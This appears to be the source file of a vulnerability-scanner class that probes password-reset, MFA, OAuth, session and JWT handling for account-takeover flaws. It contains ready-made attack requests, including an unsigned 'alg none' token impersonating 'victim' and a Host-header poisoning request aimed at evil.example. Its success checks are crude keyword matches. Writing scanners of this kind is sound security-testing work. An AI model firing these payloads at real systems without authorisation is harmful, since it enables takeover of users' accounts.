"""Account-Takeover (ATO) chain scanner.

This is a chain-aware scanner: rather than probing a single class of
flaw, it correlates findings from the password-reset / MFA / OAuth
flows to flag account-takeover chains (H100 family).

It is intentionally aggressive: when the mock transport echoes any
token / verification marker, it emits a chain finding that points the
operator to the upstream bug classes.
"""

from __future__ import annotations

import logging
from typing import Any, Dict, List, Tuple

from bugwolf.scanners import Finding, Scanner, make_finding


logger = logging.getLogger(__name__)


class ATOChainScanner(Scanner):
    name = "ato-chain"
    bug_class = "account-takeover"
    default_severity = "critical"
    PAYLOADS: Tuple[str, ...] = (
        "password-reset-token-reuse",
        "mfa-empty-token-bypass",
        "oauth-state-prediction",
        "session-fixation",
        "jwt-alg-none",
        "password-reset-host-header-poisoning",
    )

    def scan(self, target: str, transport) -> List[Finding]:
        if transport is None:
            logger.warning("ato-chain: transport is None; returning []")
            return []
        findings: List[Finding] = []
        # Probe the chain — each step uses a tiny synthetic request that
        # the mock transport may echo to surface signals.
        probes: List[Tuple[str, Dict[str, Any]]] = [
            ("password-reset-token-reuse", {
                "method": "POST",
                "body": "token=000000&new_password=Test1234!",
            }),
            ("mfa-empty-token-bypass", {
                "method": "POST",
                "headers": {"Content-Type": "application/json"},
                "body": '{"mfa_token":""}',
            }),
            ("oauth-state-prediction", {
                "method": "GET",
                "headers": {"Cookie": "oauth_state=AAAAAAAA"},
            }),
            ("session-fixation", {
                "method": "GET",
                "headers": {"Cookie": "PHPSESSID=BugWolfFix"},
            }),
            ("jwt-alg-none", {
                "method": "GET",
                "headers": {
                    "Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ2aWN0aW0ifQ.",
                },
            }),
            ("password-reset-host-header-poisoning", {
                "method": "POST",
                "headers": {"Host": "evil.example",
                            "Content-Type":
                                "application/x-www-form-urlencoded"},
                "body": "username=victim",
            }),
        ]
        for label, req in probes:
            try:
                resp: Dict[str, Any] = transport(
                    req.get("method", "GET"),
                    target,
                    headers=req.get("headers", {}),
                    body=req.get("body"),
                )
            except Exception as exc:
                logger.debug("ato: transport error: %s", exc)
                continue
            rbody = (resp.get("body", "") or "").lower()
            rheaders = resp.get("headers", {}) or {}
            blob = rbody + "\n" + "\n".join(
                f"{k}: {v}".lower() for k, v in rheaders.items()
            )
            signals = {
                "password-reset-token-reuse":
                    ("success" in rbody or "password" in rbody),
                "mfa-empty-token-bypass":
                    ("verified" in rbody or "success" in rbody),
                "oauth-state-prediction":
                    ("code=" in rbody or "access_token=" in rbody),
                "session-fixation":
                    ("phpsessid=bugwolffix" in blob),
                "jwt-alg-none":
                    ("welcome" in rbody or "dashboard" in rbody),
                "password-reset-host-header-poisoning":
                    ("evil.example" in rbody),
            }
            if signals.get(label):
                findings.append(make_finding(
                    self,
                    target=target,
                    evidence=f"ATO chain step {label!r} succeeded",
                    severity="critical",
                    bug_class="account-takeover",
                    detail={
                        "step": label,
                        "status": resp.get("status"),
                        "snippet": rbody[:160],
                    },
                ))
        return findings


__all__ = ["ATOChainScanner"]